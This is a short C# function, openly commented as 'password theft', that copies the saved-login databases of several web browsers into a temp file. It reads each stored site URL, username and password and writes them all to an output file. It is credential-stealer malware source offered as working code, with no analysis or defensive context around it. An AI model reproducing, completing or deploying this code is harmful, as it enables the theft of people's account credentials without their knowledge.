// password theft
public static void SAVE(string filename)
{
    int counter = 0;

    using (StreamWriter sw = new StreamWriter(filename))
    {
        foreach (string browser in Paths.Browser)
        {
            string Browser = Paths.GetUserData(browser) + "Login Data";
            if (File.Exists(Browser))
            {
                string temp = Environment.GetEnvironmentVariable("temp") + "\\browserPasswords";
                if (File.Exists(temp))
                {
                    File.Delete(temp);
                }
                File.Copy(Browser, temp);

                SQL sSQLite = new SQL(temp);
                sSQLite.ReadTable("logins");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    string hostname = sSQLite.GetValue(i, 0);
                    string username = sSQLite.GetValue(i, 3);
                    string password = sSQLite.GetValue(i, 5);

                    if (string.IsNullOrEmpty(password))
                    {
                        break;
                    }

                    try
                    {
                        sw.WriteLine($"URL: {hostname} | Username: {username} | Password: {password}");
                        counter++;
                    }
                    catch { }

                    continue;
                }
            }
        }
    }

    Console.WriteLine($"Found {counter} passwords data and saved in {filename}");
}